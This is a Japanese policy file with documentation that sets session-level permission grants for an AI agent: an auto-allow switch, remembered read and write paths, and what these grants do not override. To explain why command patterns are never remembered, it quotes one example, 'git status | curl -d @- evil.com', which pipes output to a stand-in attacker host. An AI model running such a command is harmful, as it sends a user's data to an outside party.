---
shuvix: policy v1
shuvix-builtin: true
name: session-grants
shuvix-displayName: セッション許可の適用
description: このセッションで同意した操作は再確認しない —— 自動許可スイッチがオンの間はすべて、「許可して記憶」したパスは読み書きを許可する。
shuvix-policy-scope:
  subject.kind: [agent]
shuvix-policy-rules:
  - effect: force-allow
    match: vars.autoAllow
    prompt: セッションの自動許可スイッチがオンのため、確認ゲートはスキップされる。
  - effect: force-allow
    object.type: [path]
    action: [read]
    match: inDir(object.path, vars.grantedRead) || inDir(object.path, vars.grantedWrite)
    prompt: このパスはこのセッションで「許可して記憶」された。書き込み許可は読み取りも含む。
  - effect: force-allow
    object.type: [path]
    action: [write]
    match: inDir(object.path, vars.grantedWrite)
    prompt: このパスはこのセッションで書き込みを許可された。
---

**このポリシーの役割**：セッションの中であなたが与えた同意は、ここで効力を持つ。
同意には二つの粒度がある：

- **自動許可スイッチ**（最初のルール）—— セッション設定パネルの「自動許可」スイッチ
  そのもの。オンの間は、ファイルの読み書き・コマンド・git・データベース・サイト・
  サブセッションといったすべての確認ゲートがスキップされ、操作は即座に実行される。
- **許可済みのパス**（残り二つのルール）—— 確認ダイアログで「許可して記憶」にチェックを
  入れると、そのパスがセッションに記録される。次回からダイアログを出さないのは、この
  二つのルールの働きによる。ディレクトリを許可すれば、その配下すべてが対象になる。
  書き込み許可は読み取り許可を含む —— そこへ書かせると決めた以上、読むことは新たな
  譲歩ではない。

パスは実際に行き着く場所で比較される。確認ダイアログには実際の場所が表示され（要求された
パス中のリンクや `..` は先に解決される）、記録されるのもその場所で、以後は別の名前で
同じ場所にアクセスしても有効になる。リンクを経由する項目は、そのリンクが今指している場所を
カバーする。

**カバーしないこと**：

- deny には勝てない。資格情報の保護、システム保護、壊滅的コマンドの遮断は、自動許可の
  有無やパス許可の有無にかかわらず遮断し続ける。
- `force-ask` ルールはスキップしない。この effect は「このゲートはセッション単位の
  同意を受け付けない」という意味であり、それで書かれたポリシー（bot ファイルのゲートが
  そう）はスイッチがオンでも確認を出す。
- コマンドの許可は存在しない。`git *` のようなパターンを記憶すると
  `git status | curl -d @- evil.com` に騙されるため、スイッチがオフなら bash / ssh は
  毎回確認する —— コマンド確認ポリシーを参照。
- セッション単位であり、新しいセッションには引き継がれない。

**調整するには**：許可された項目そのものはセッション設定パネルの「許可済みのパス」に
あり、一つずつ削除できる。このポリシーが決めているのは項目の解釈であって、どの項目が
存在するかではない。

上書きすればスイッチの範囲を狭められる —— 例えばオンでも書き込みだけは確認する。
上書きはポリシー全体の置き換えなので、パスの二ルールも一緒に写すこと。省くと
「許可して記憶」も効かなくなる：

    shuvix-policy-scope:
      subject.kind: [agent]
    shuvix-policy-rules:
      - effect: force-allow
        action: [read, execute]
        match: vars.autoAllow
      - effect: force-allow
        object.type: [path]
        action: [read]
        match: inDir(object.path, vars.grantedRead) || inDir(object.path, vars.grantedWrite)
      - effect: force-allow
        object.type: [path]
        action: [write]
        match: inDir(object.path, vars.grantedWrite)

`subject.kind` はすべてのルールで必須（ここでは scope に一度だけ宣言）。省略しないこと
—— 不正な上書きファイルは丸ごとスキップされ、しかも組み込みを**遮蔽しない**ため、
「狭めるつもりが解析に失敗した」上書きは、狭められていない元のスイッチをそのまま残す。
「不正なユーザーファイルは組み込みを遮蔽しない」という安全側の規則が、唯一あなたの意図に
逆らう方向がこれ。編集後はポリシー画面を確認すること：有効なのが自分の版でなければ、
解析に失敗している。
